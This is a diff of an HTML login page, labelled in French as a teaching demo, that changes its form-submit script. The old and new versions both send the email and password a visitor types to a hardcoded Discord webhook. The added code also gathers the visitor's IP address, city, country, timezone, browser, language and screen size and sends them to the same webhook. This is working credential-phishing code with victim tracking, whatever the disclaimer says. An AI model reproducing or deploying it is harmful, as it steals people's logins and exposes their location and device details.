@@ -159,26 +159,58 @@
     <div class="note">* Ceci est une démonstration pédagogique – aucun compte réel.</div>
   </div>
 
-  <script>
-    document.getElementById("login-form").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+<script>
+  document.getElementById("login-form").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-      // Correction de l'URL du webhook
-      const webhookURL = "https://discord.com/api/webhooks/1360585270931751153/V_j_RxG3xVIjFiWyHyJJkIl4PI0p8mzhvZG2uxizjEWgbbPH9gkRkoopMbDILFIRLDg3";
+    let ip = "Inconnu";
+    let city = "", region = "", country = "", timezone = "";
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `🔐 **Test de connexion (PoC)**\n📧 Email : ${email}\n🔑 Mot de passe : ${password}`
-        })
-      });
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      ip = data.ip || "Inconnu";
+      city = data.city || "";
+      region = data.region || "";
+      country = data.country_name || "";
+      timezone = data.timezone || "";
+    } catch (err) {
+      console.error("Erreur lors de la récupération IP/Géo :", err);
+    }
 
-      alert("Merci ! Démonstration terminée.");
-      document.getElementById("login-form").reset();
+    const userAgent = navigator.userAgent;
+    const language = navigator.language || navigator.userLanguage;
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const currentPage = window.location.href;
+
+    const webhookURL = "https://discord.com/api/webhooks/1360585270931751153/V_j_RxG3xVIjFiWyHyJJkIl4PI0p8mzhvZG2uxizjEWgbbPH9gkRkoopMbDILFIRLDg3";
+
+    const content = `🔐 **Nouvelle connexion (PoC)**
+
+📧 **Email :** ${email}
+🔑 **Mot de passe :** ${password}
+
+🌐 **Adresse IP :** ${ip}
+📍 **Localisation :** ${city}, ${region}, ${country}
+🕒 **Fuseau horaire :** ${timezone}
+🗺️ **Langue :** ${language}
+
+🧭 **Navigateur :** ${userAgent}
+🖥️ **Résolution écran :** ${screenRes}
+🔗 **Page visitée :** ${currentPage}
+`;
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
     });
-  </script>
+
+    alert("Merci ! Démonstration terminée.");
+    document.getElementById("login-form").reset();
+  });
+</script>
 </body>
 </html>
